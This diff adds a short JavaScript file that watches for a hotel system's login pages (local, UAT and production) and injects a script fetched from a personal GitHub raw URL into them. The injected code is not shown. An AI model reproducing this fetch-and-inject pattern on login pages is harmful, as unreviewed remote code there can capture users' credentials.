@@ -1,0 +1,30 @@
+const LOCAL = "http://localhost:3500";
+const UAT = "https://uat-hotel.ast.com.vn";
+const PROD = "https://khachsan.ast.com.vn";
+const linkFile = "https://raw.githubusercontent.com/hoangtule-ast/pub/refs/heads/main/src/login.js";
+
+async function init() {
+    const SCRIPT_ID = "my-injected-script";
+
+    // nếu đã tồn tại thì không chạy nữa
+    if (document.getElementById(SCRIPT_ID)) return;
+
+    const res = await fetch(linkFile);
+    const code = await res.text();
+
+    const script = document.createElement("script");
+    script.id = SCRIPT_ID;
+    script.textContent = code;
+
+    document.documentElement.appendChild(script);
+}
+
+let lastUrl = location.href;
+setInterval(() => {
+    if (location.href !== lastUrl && [LOCAL, UAT, PROD].map(p => `${p}/core/auth/login`).some(p => location.href.includes(p))) {
+        lastUrl = location.href;
+        console.log("URL changed:", lastUrl);
+        init();
+    }
+}, 300);
+
